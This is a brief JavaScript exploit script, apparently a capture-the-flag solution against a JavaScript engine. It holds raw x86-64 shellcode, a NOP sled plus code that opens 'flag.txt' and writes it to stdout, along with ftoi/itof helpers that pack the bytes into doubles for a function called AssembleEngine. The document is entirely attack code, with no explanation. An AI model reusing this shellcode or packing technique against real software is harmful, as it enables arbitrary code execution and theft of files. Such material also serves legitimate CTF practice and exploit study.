var shellcode = [144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,106,1,254,12,36,72,184,102,108,97,103,46,116,120,116,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,106,1,95,153,15,5,];

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var aux = [];
for (var i = 0; i < shellcode.length + 8 - (shellcode.length % 8); i += 8) {
    var sum = 0n;
    for (var j = 0; j < 8; j++) {
        sum += BigInt(shellcode[i + j] || 0) << BigInt(8 * j);
    }
    aux.push(sum);
}
// aux = aux.map(itof);
console.log(aux.map(aux => aux.toString(16)));
shellcode = aux.map(itof);
AssembleEngine(shellcode);
// group elem 